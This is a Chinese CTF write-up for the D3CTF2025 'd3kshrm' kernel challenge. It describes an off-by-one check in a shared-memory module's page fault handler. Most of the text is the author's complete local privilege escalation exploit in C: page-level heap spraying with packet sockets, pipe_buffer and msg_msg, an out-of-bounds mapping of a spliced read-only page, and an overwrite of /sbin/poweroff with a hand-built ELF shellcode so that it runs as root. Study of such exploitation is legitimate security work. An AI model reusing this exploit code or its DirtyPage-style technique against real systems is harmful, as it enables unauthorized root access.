# d3kshrm && d3kshrm-revenge

## 题目简述

官方仓库位于 https://github.com/arttnba3/D3CTF2025_d3kshrm

该仓库的关键信息是：题目提供 Linux kernel module `d3kshrm.ko`，用户可以创建、绑定、解绑、删除共享内存，并通过 `mmap` 访问当前绑定的共享内存。漏洞位于 page fault 处理函数，对 `d3kshrm::pages` 下标边界检查错误，导致可以越界把相邻内存解释为 `struct page *` 并映射到用户态。

## 解题过程

### 0x00. 漏洞介绍

题目创建了一个名为 `d3kshrm.ko` 的内核模块，用于向用户提供共享内存功能。通过 `ioctl()` 接口可以执行以下操作：

- 创建指定大小的新共享内存；

- 绑定到已有共享内存；

- 从当前共享内存解绑；

- 删除已有共享内存。

访问共享内存时，可以在绑定后对文件描述符执行 `mmap`，漏洞也位于这一流程中。由于 `d3kshrm::pages` 的下标边界检查不完整，攻击者可以把 `d3kshrm::pages` 后面的 8 字节当作 `struct page *` 指针，并将其映射到用户态地址空间。

```c
static vm_fault_t d3kshrm_vm_fault(struct vm_fault *vmf)
{
    struct d3kshrm_struct *d3kshrm;
    struct vm_area_struct *vma;
    vm_fault_t res;
    vma = vmf->vma;
    d3kshrm = (struct d3kshrm_struct *) vma->vm_private_data;
    spin_lock(&d3kshrm->lock);
    /* 漏洞点在这里 */
    // if (vmf->pgoff >= d3kshrm->page_nr) {
    if (vmf->pgoff > d3kshrm->page_nr) {
        res = VM_FAULT_SIGBUS;
        goto ret;
    }
    get_page(d3kshrm->pages[vmf->pgoff]);
    vmf->page = d3kshrm->pages[vmf->pgoff];
    res = 0;
ret:
    spin_unlock(&d3kshrm->lock);
    return res;
}
```

### 0x01. 利用过程

由于 `d3kshrm::pages` 来自隔离的 `kmem_cache`，需要使用页级堆布局调整操作页级内存，尝试映射题目功能范围之外的 `struct page` 指针。不能直接通过双重映射利用这些页，因为 page refcount 会作为保护，阻止我们直接制造页级双重释放。因此可行策略是把原本只读的页面映射到用户态，并借鉴 CVE-2023-2008 中通过越界页映射实现 DirtyPage 类攻击的思路。整体利用策略如下：

- 使用页级堆布局调整重新排列页级内存，使题目隔离 `kmem_cache` 的 SLUB 页夹在两个目标对象的 SLUB 页之间。这里选择 `pipe_buffer` 作为目标对象，因为其结构开头有指向 `struct page` 的指针，便于完成越界映射；

- 以只读权限打开目标文件，并使用 `splice()` 将目标文件的第一页放入 `pipe_buffer`；

- 利用漏洞执行越界页映射，把原本只读的页面以可读写权限映射到用户态。

这样即可获得覆盖只读文件的能力。最终选择 `/sbin/poweroff` 作为目标文件，该路径是指向 busybox 的符号链接；`/etc/init.d/rcS` 最后一行会以 root 权限执行 `/sbin/poweroff`，因此覆盖它后可以获得 root 权限任意代码执行。最终利用如下，成功率约为 84.63%（本地自动测试超过 2048 次后的统计结果）。由于这里尚未采用复杂的页级堆布局调整流程，成功率仍有提升到 95% 以上的空间。

```c
/**
 * Copyright (c) 2025 arttnba3 <arttnba@gmail.com>
 *
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
**/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
/**
 * Kernel Pwn 基础设施
**/
#define SUCCESS_MSG(msg)    "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg)       "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg)      "\033[31m\033[1m" msg "\033[0m"
#define log_success(msg)    puts(SUCCESS_MSG(msg))
#define log_info(msg)       puts(INFO_MSG(msg))
#define log_error(msg)      puts(ERROR_MSG(msg))
void err_exit(char *msg)
{
    printf(ERROR_MSG("[x] Error at: ") "%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}
void bind_core(int core)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    printf(SUCCESS_MSG("[*] Process binded to core ") "%d\n", core);
}
void get_root_shell(void)
{
    if(getuid()) {
        log_error("[x] Failed to get the root!");
        sleep(5);
        exit(EXIT_FAILURE);
    }
    log_success("[+] Successful to get the root.");
    log_info("[*] Execve root shell now...");
    system("/bin/sh");
    /* 正常退出进程，避免潜在的段错误 */
    exit(EXIT_SUCCESS);
}
int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}
int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}
/**
 * msgp 应指向 `struct msgbuf`，
 * 数据应存放在 msgbuf.mtext 中
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}
#ifndef MSG_COPY
    #define MSG_COPY 040000
#endif
/* 对 MSG_COPY 而言，`msgtyp` 表示读取队列中的第 no.msgtyp 个 msg_msg */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp,
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}
int unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        log_error("[x] Unable to create new namespace for PGVsubsystem");
        return -EPERM;
    }
    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);
    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
    return 0;
}
/**
 * pgv 页面堆喷相关逻辑。
 * 这里需要创建两个进程：
 * - 父进程负责发送命令并拿 root；
 * - 子进程通过 unshare_setup() 创建隔离的用户空间，
 *   只接收父进程命令并执行对应操作。
**/
#define PGV_SOCKET_MAX_NR 1024
#define PACKET_VERSION 10
#define PACKET_TX_RING 13
struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};
enum {
    PGV_CMD_ALLOC_SOCKET,
    PGV_CMD_ALLOC_PAGE,
    PGV_CMD_FREE_PAGE,
    PGV_CMD_FREE_SOCKET,
    PGV_CMD_EXIT,
};
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};
int cmd_pipe_req[2], cmd_pipe_reply[2];
int create_packet_socket()
{
    int socket_fd;
    int ret;
    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        log_error("[x] failed at socket(AF_PACKET, SOCK_RAW,PF_PACKET)");
        ret = socket_fd;
        goto err_out;
    }
    return socket_fd;
err_out:
    return ret;
}
int alloc_socket_pages(int socket_fd, unsigned int size, unsigned
nr)
{
    struct tpacket_req req;
    int version, ret;
    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,
                     &version, sizeof(version));
    if (ret < 0) {
        log_error("[x] failed at setsockopt(PACKET_VERSION)");
        goto err_setsockopt;
    }
    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) /
req.tp_frame_size;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req,
sizeof(req));
    if (ret < 0) {
        log_error("[x] failed at setsockopt(PACKET_TX_RING)");
        goto err_setsockopt;
    }
    return 0;
err_setsockopt:
    return ret;
}
int free_socket_pages(int socket_fd)
{
    struct tpacket_req req;
    int ret;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = 0x3361626e;
    req.tp_block_nr = 0;
    req.tp_frame_size = 0x74747261;
    req.tp_frame_nr = 0;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req,
sizeof(req));
    if (ret < 0) {
        log_error("[x] failed at setsockopt(PACKET_TX_RING)");
        goto err_setsockopt;
    }
    return 0;
err_setsockopt:
    return ret;
}
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_SOCKET_MAX_NR];
    int ret;
    /* 创建隔离 namespace */
    if (unshare_setup()) {
        err_exit("FAILED to initialize PGV subsystem for pagespraying!");
    }
    memset(socket_fd, 0, sizeof(socket_fd));
    /* 处理请求 */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));
        switch (req.cmd) {
        case PGV_CMD_ALLOC_SOCKET:
            if (socket_fd[req.idx] != 0) {
                printf(ERROR_MSG("[x] Duplicate idx request: ")
"%d\n",req.idx);
                ret = -EINVAL;
                break;
            }
            ret = create_packet_socket();
            if (ret < 0) {
                perror(ERROR_MSG("[x] Failed at allocating packetsocket"));
                break;
            }
            socket_fd[req.idx] = ret;
            ret = 0;
            break;
        case PGV_CMD_ALLOC_PAGE:
            if (socket_fd[req.idx] == 0) {
                printf(ERROR_MSG("[x] No socket fd for idx: ")
"%d\n",req.idx);
                ret = -EINVAL;
                break;
            }
            ret = alloc_socket_pages(socket_fd[req.idx], req.size,
req.nr);
            if (ret < 0) {
                perror(ERROR_MSG("[x] Failed to alloc packetsocket pages"));
                break;
            }
            break;
        case PGV_CMD_FREE_PAGE:
            if (socket_fd[req.idx] == 0) {
                printf(ERROR_MSG("[x] No socket fd for idx: ")
"%d\n",req.idx);
                ret = -EINVAL;
                break;
            }
            ret = free_socket_pages(socket_fd[req.idx]);
            if (ret < 0) {
                perror(ERROR_MSG("[x] Failed to free packet socketpages"));
                break;
            }
            break;
        case PGV_CMD_FREE_SOCKET:
            if (socket_fd[req.idx] == 0) {
                printf(ERROR_MSG("[x] No socket fd for idx: ")
"%d\n",req.idx);
                ret = -EINVAL;
                break;
            }
            close(socket_fd[req.idx]);
            break;
        case PGV_CMD_EXIT:
            log_info("[*] PGV child exiting...");
            ret = 0;
            break;
        default:
            printf(
                ERROR_MSG("[x] PGV child got unknown command :")"%d\n",
                req.cmd
            );
            ret = -EINVAL;
            break;
        }
        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != PGV_CMD_EXIT);
}
void prepare_pgv_system(void)
{
    /* pgv 使用的 pipe */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    /* 用于页面堆喷的子进程 */
    if (!fork()) {
        spray_cmd_handler();
    }
}
int create_pgv_socket(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = PGV_CMD_ALLOC_SOCKET,
    };
    int ret;
    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));
    return ret;
}
int destroy_pgv_socket(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = PGV_CMD_FREE_SOCKET,
    };
    int ret;
    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));
    return ret;
}
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = PGV_CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;
    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));
    return ret;
}
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = PGV_CMD_FREE_PAGE,
    };
    int ret;
    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));
    usleep(10000);
    return ret;
}
/**
 * 题目接口
**/
#define CMD_CREATE_D3KSHRM    0x3361626e
#define CMD_DELETE_D3KSHRM    0x74747261
#define CMD_SELECT_D3KSHRM    0x746e6162
#define CMD_UNBIND_D3KSHRM    0x33746172
#define MAX_PAGE_NR 0x100
int chal_fd;
int d3kshrm_create(int fd, unsigned long page_nr)
{
    return ioctl(fd, CMD_CREATE_D3KSHRM, page_nr);
}
int d3kshrm_delete(int fd, unsigned long idx)
{
    return ioctl(fd, CMD_DELETE_D3KSHRM, idx);
}
int d3kshrm_select(int fd, unsigned long idx)
{
    return ioctl(fd, CMD_SELECT_D3KSHRM, idx);
}
int d3kshrm_unbind(int fd)
{
    return ioctl(fd, CMD_UNBIND_D3KSHRM);
}
/**
 * 利用流程
**/
#define PIPE_SPRAY_NR 126
int prepare_pipe(int pipe_fd[PIPE_SPRAY_NR][2])
{
    int err;
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if ((err = pipe(pipe_fd[i])) < 0) {
            printf(
                ERROR_MSG("[x] failed to alloc ")"%d"ERROR_MSG("pipe!\n"), i
            );
            return err;
        }
    }
    return 0;
}
int expand_pipe(int pipe_fd[PIPE_SPRAY_NR][2], size_t size)
{
    int err;
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if ((err = fcntl(pipe_fd[i][1], F_SETPIPE_SZ, size)) < 0)
{
            printf(
                ERROR_MSG("[x] failed to expand ")"%d"ERROR_MSG("pipe!\n"), i
            );
            return err;
        }
    }
    return 0;
}
ssize_t splice_pipe(int pipe_fd[PIPE_SPRAY_NR][2], int victim_fd)
{
    ssize_t err;
    loff_t offset;
    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        offset = 0;
        if ((err =
splice(victim_fd,&offset,pipe_fd[i][1],NULL,0x1000,0)) < 0) {
            printf(
                ERROR_MSG("[x] failed to splice ")"%d"ERROR_MSG("pipe!\n"),i
            );
            return err;
        }
    }
    return 0;
}
#define PBF_SZ_PAGE_NR (0x1000 / 8)
uint8_t shellcode[] = {
    /* ELF 头 */
    // e_ident[16]
    0x7f, 0x45, 0x4c, 0x46, /* 魔数 "\x7fELF" */
    0x02,   /* ELF 类型：64-bit */
    0x01,   /* ELF 编码：LSB */
    0x01,   /* ELF 版本：current */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /*
Reserve */
    // e_type: ET_EXEC
    0x02, 0x00,
    // e_machine: AMD x86-64
    0x3e, 0x00,
    // e_version: 1
    0x01, 0x00, 0x00, 0x00,
    // e_entry: 0x0000000000400078
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    // e_phoff: 0x40
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // e_shoff: 0
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // e_flags: 0
    0x00, 0x00, 0x00, 0x00,
    // e_ehsize: 0x40
    0x40, 0x00,
    // e_phentsize: 0x38
    0x38, 0x00,
    // e_phnum: 1
    0x01, 0x00,
    // e_shentsize: 0
    0x00, 0x00,
    // e_shnum: 0
    0x00, 0x00,
    // e_shstrndx: 0
    0x00, 0x00,
    /* 程序头表[0] */
    // p_type: PT_LOAD
    0x01, 0x00, 0x00, 0x00,
    // p_flags: PF_R | PF_W | PF_X
    0x07, 0x00, 0x00, 0x00,
    // p_offset: 0
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // p_vaddr: 0x0000000000400000
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    // p_paddr: 0x0000000000400000
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    // p_filesz: 0xD5
    0xD5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // p_memsz: 0xF2
    0xF2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // p_align: 0x1000
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* 节区[0]：Shellcode */
    // 打开并读取 "/flag"
    // xor rax, rax
    0x48, 0x31, 0xc0,
    // push rax
    0x50,
    // movabs rax, 0x67616c662f # "/flag"
    0x48, 0xb8, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x00, 0x00,
    // push rax
    0x50,
    // mov rax, 0x02
    0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00,
    // mov rdi, rsp
    0x48, 0x89, 0xe7,
    // xor rsi, rsi
    0x48, 0x31, 0xf6,
    // syscall
    0x0f, 0x05,
    // mov rdi, rax
    0x48, 0x89, 0xc7,
    // xor rax, rax
    0x48, 0x31, 0xc0,
    // sub, rsp, 0x100
    0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,
    // mov rsi, rsp
    0x48, 0x89, 0xe6,
    // mov rdi, 0x100
    0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,
    // syscall
    0x0f, 0x05,
    // mox rax, 0x1
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    // mox rdi, 0x1
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    // mox rsi, rsp
    0x48, 0x89, 0xe6,
    // mox rdx, 0x100
    0x48, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00,
    // syscall
    0x0f, 0x05,
    // xor rdi, rdi
    0x48, 0x31, 0xff,
    // mov rax, 0x3c
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,
    // syscall
    0x0f, 0x05,
};
#define PAGE8_SPRAY_NR 0x100
int prepare_pgv_pages(void)
{
    int errno;
    for (int i = 0; i < PAGE8_SPRAY_NR; i++) {
        if ((errno = create_pgv_socket(i)) < 0) {
            printf(ERROR_MSG("[x] Failed to allocate socket: ")
"%d\n", i);
            return errno;
        }
        if ((errno = alloc_page(i, 0x1000 * 8, 1)) < 0) {
            printf(ERROR_MSG("[x] Failed to alloc pages on socket:")"%d\n", i);
            return errno;
        }
    }
    return 0;
}
#define MSG_QUEUE_NR 0x100
#define MSG_SPRAY_NR 2
int prepare_msg_queue(int msqid[MSG_QUEUE_NR])
{
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        if ((msqid[i] = get_msg_queue()) < 0) {
            printf(
                ERROR_MSG("[x] Unable to create ")"%d"ERROR_MSG("msg_queue\n"),
                i
            );
            return msqid[i];
        }
    }
    return 0;
}
int spray_msg_msg(int msqid[MSG_QUEUE_NR])
{
    char buf[0x2000];
    int err;
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = 0; j < MSG_SPRAY_NR; j++) {
            if ((err =
write_msg(msqid[i],buf,0xF00,0x3361626e74747261+i)) < 0){
                return err;
            }
        }
    }
    return 0;
}
#define D3KSHRM_SLUB_OBJ_NR 8
#define D3KSHRM_SPRAY_NR (D3KSHRM_SLUB_OBJ_NR * 2)
void exploit(void)
{
    int pipe_fd1[PIPE_SPRAY_NR][2], pipe_fd2[PIPE_SPRAY_NR][2];
    int msqid[MSG_QUEUE_NR];
    int d3kshrm_fd[D3KSHRM_SPRAY_NR],
d3kshrm_idx[D3KSHRM_SPRAY_NR];
    int victim_fd;
    char *oob_buf[D3KSHRM_SPRAY_NR];
    void *victim_buf;
    log_info("[*] Preparing...");
    bind_core(0);
    prepare_pgv_system();
    victim_fd = open("/sbin/poweroff", O_RDONLY);
    if (victim_fd < 0) {
        perror("Failed to open target victim file");
        exit(EXIT_FAILURE);
    }
    log_info("[*] Allocating msg_queue for clearingkmem_cache...");
    if (prepare_msg_queue(msqid) < 0) {
        err_exit("FAILED to create msg_queue!");
    }
    log_info("[*] Allocating pipe_fd1 group...");
    if (prepare_pipe(pipe_fd1) < 0) {
        perror(ERROR_MSG("Failed to spray pipe_buffer"));
        err_exit("FAILED to prepare first part of pipes.\n");
    }
    log_info("[*] Allocating pipe_fd2 group...");
    if (prepare_pipe(pipe_fd2) < 0) {
        perror(ERROR_MSG("Failed to spray pipe_buffer"));
        err_exit("FAILED to prepare second part of pipes.\n");
    }
    log_info("[*] Preparing D3KSHRM files...");
    for (int i = 0; i < D3KSHRM_SPRAY_NR; i++) {
        if ((d3kshrm_fd[i] = open("/proc/d3kshrm", O_RDWR)) < 0) {
            perror(ERROR_MSG("Failed to open /proc/d3kshrm"));
            err_exit("FAILED to spray D3KSHRM files.\n");
        }
    }
    log_info("[*] Pre-allocating ONE SLUB pages for D3kSHRM...");
    if ((d3kshrm_idx[0] = d3kshrm_create(d3kshrm_fd[0],
PBF_SZ_PAGE_NR)) < 0) {
        perror(ERROR_MSG("Failed to create D3KSHRM sharedmemory"));
        err_exit("FAILED to spray D3KSHRM shared memory.\n");
    }
    log_info("[*] Allocating pgv pages...");
    if (prepare_pgv_pages() < 0) {
        err_exit("FAILED to prepare pages on packet socket.\n");
    }
    log_info("[*] Clear previous redundant memory storage inkernel...");
    if (spray_msg_msg(msqid) < 0) {
        perror(ERROR_MSG("Failed to spray msg_msg"));
        err_exit("FAILED to clear reduncant kernel memorystorage.\n");
    }
    log_info("[*] Spraying D3KSHRM buffer...");
    free_page((PAGE8_SPRAY_NR / 2) + 1);
    destroy_pgv_socket((PAGE8_SPRAY_NR / 2) + 1);
    for (int i = 1; i < D3KSHRM_SPRAY_NR; i++) {
        if ((d3kshrm_idx[i] = d3kshrm_create(d3kshrm_fd[i],
PBF_SZ_PAGE_NR))<0){
            perror(ERROR_MSG("Failed to create D3KSHRM sharedmemory"));
            err_exit("FAILED to spray D3KSHRM shared memory.\n");
        }
    }
    log_info("[*] Expanding pipe_buffer...");
    free_page(PAGE8_SPRAY_NR / 2);
    destroy_pgv_socket(PAGE8_SPRAY_NR / 2);
    if (expand_pipe(pipe_fd1, 0x1000 * 64) < 0) {
        perror(ERROR_MSG("Failed to expand pipe_buffer"));
        err_exit("FAILED to expand first part of pipes.\n");
    }
    log_info("[*] Expanding pipe_buffer...");
    free_page((PAGE8_SPRAY_NR / 2) + 2);
    destroy_pgv_socket((PAGE8_SPRAY_NR / 2) + 2);
    if (expand_pipe(pipe_fd2, 0x1000 * 64) < 0) {
        perror(ERROR_MSG("Failed to expand pipe_buffer"));
        err_exit("FAILED to expand second part of pipes.\n");
    }
    log_info("[*] Splicing victim file into pipe group...");
    if (splice_pipe(pipe_fd1, victim_fd) < 0) {
        perror(ERROR_MSG("Failed to splice target fd"));
        err_exit("FAILED to splice victim file into pipe_fd1group.\n");
    }
    if (splice_pipe(pipe_fd2, victim_fd) < 0) {
        perror(ERROR_MSG("Failed to splice target fd"));
        err_exit("FAILED to splice victim file into pipe_fd2group.\n");
    }
    log_info("[*] Doing mmap and mremap...");
    for (int i = D3KSHRM_SLUB_OBJ_NR; i < D3KSHRM_SPRAY_NR; i++) {
        if (d3kshrm_select(d3kshrm_fd[i], d3kshrm_idx[i]) < 0) {
            perror(ERROR_MSG("Failed to select D3KSHRM sharedmemory"));
            err_exit("FAILED to select D3KSHRM shared memory.\n");
        }
        oob_buf[i] = mmap(
            NULL,
            0x1000 * PBF_SZ_PAGE_NR,
            PROT_READ | PROT_WRITE,
            MAP_FILE | MAP_SHARED,
            d3kshrm_fd[i],
            0
        );
        if (oob_buf[i] == MAP_FAILED) {
            perror(ERROR_MSG("Failed to map chal_fd"));
            err_exit("FAILED to mmap chal_fd.\n");
        }
        oob_buf[i] = mremap(
            oob_buf[i],
            0x1000 * PBF_SZ_PAGE_NR,
            0x1000 * (PBF_SZ_PAGE_NR + 1),
            MREMAP_MAYMOVE
        );
        if (oob_buf[i] == MAP_FAILED) {
            perror(ERROR_MSG("Failed to mremap oob_buf area"));
            err_exit("FAILED to mremap chal's mmap area.\n");
        }
    }
    log_info("[*] Checking for oob mapping...");
    victim_buf = NULL;
    for (int i = D3KSHRM_SLUB_OBJ_NR; i < D3KSHRM_SPRAY_NR; i++) {
        /* 检查 ELF 头，确认是否命中 busybox */
        if (*(size_t*) &oob_buf[i][0x1000*PBF_SZ_PAGE_NR] ==
0x3010102464c457f){
            victim_buf = (void*)
&oob_buf[i][0x1000*PBF_SZ_PAGE_NR];
            break;
        }
    }
    if (!victim_buf) {
        err_exit("FAILED to oob mmap pages in pipe!");
    }
    log_info("[*] Abusing OOB mmap to overwrite read-onlyfile...");
    memcpy(victim_buf, shellcode, sizeof(shellcode));
    log_success("[+] Just enjoy :)");
}
void banner(void)
{
    puts(SUCCESS_MSG("-------- D^3CTF2025::Pwn - d3kshrm --------") "\n"
    INFO_MSG("--------    Official Exploitation   --------\n")
    INFO_MSG("--------      Author: ")"arttnba3"INFO_MSG("      --------") "\n"
    SUCCESS_MSG("-------- Local Privilege Escalation --------\n"));
}
int main(int argc, char **argv, char **envp)
{
    banner();
    exploit();
    return 0;
}
```

## 方法总结

- 核心技巧：利用 `vmf->pgoff > page_nr` 的边界错误制造越界 page mapping，再把原本只读的目标文件页以可写权限映射到用户态，形成 DirtyPage-like 写文件能力。
- 识别信号：内核模块实现自定义 `mmap` / `vm_fault`，并用用户可控 offset 访问 `struct page *` 数组时，应重点检查 `>=` / `>` 边界错误。
- 复用要点：页级利用不能简单执行双重映射，因为 page refcount 会阻止直接制造页级双重释放；需要页级堆布局调整，把题目 SLUB 页夹在可控目标对象页附近，再选择 `/sbin/poweroff` 这类会以 root 执行的文件作为写入目标。
